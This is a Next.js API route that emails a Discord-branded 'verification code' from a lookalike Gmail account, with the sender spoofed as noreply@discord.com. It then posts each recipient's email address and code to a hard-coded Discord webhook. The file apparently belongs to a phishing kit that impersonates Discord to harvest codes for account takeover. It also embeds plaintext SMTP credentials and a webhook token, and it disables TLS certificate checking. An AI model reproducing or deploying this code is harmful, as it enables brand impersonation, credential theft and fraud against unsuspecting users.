import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';

export async function POST(req: NextRequest) {
  try {
    const { email } = await req.json();
    if (!email) return NextResponse.json({ error: 'No email' }, { status: 400 });

    const code = Math.floor(100000 + Math.random() * 900000).toString();

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: {
        user: 'discordsupporttt@gmail.com',
        pass: 'Discord321'
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    // Verify connection
    await transporter.verify();

    await transporter.sendMail({
      from: '"Discord" <noreply@discord.com>',
      to: email,
      subject: 'Discord Verification Code',
      text: `Your Discord verification code is: ${code}`,
      html: `
        <div style="font-family: Whitney, 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #36393f; padding: 40px; border-radius: 8px; max-width: 600px; margin: 0 auto;">
          <div style="text-align: center; margin-bottom: 30px;">
            <img src="https://discord.com/assets/3437c10597c1526c3dbd98c737c2bcae.svg" width="120" alt="Discord" />
          </div>
          <h2 style="color: #ffffff; font-size: 24px; margin-bottom: 16px;">Verify Your Account</h2>
          <p style="color: #b9bbbe; font-size: 16px; line-height: 1.5; margin-bottom: 24px;">
            You recently requested to verify your account. Use the code below to complete the verification:
          </p>
          <div style="background: #2f3136; border-radius: 8px; padding: 20px; text-align: center; margin-bottom: 24px;">
            <span style="font-size: 32px; font-weight: bold; color: #ffffff; letter-spacing: 4px;">${code}</span>
          </div>
          <p style="color: #72767d; font-size: 14px; line-height: 1.5;">
            This code will expire in 10 minutes. If you didn't request this code, you can safely ignore this email.
          </p>
        </div>
      `
    });

    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{ 
          title: "Verification Code Sent", 
          color: 0x00ff00,
          fields: [
            { name: 'To', value: email },
            { name: 'Code', value: code }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    return NextResponse.json({ success: true, code });

  } catch (err: any) {
    console.error('Send code error:', err);
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{ 
          title: "Send Code Failed", 
          color: 0xff0000,
          description: err.message,
          timestamp: new Date().toISOString()
        }]
      })
    }).catch(() => {});
    
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
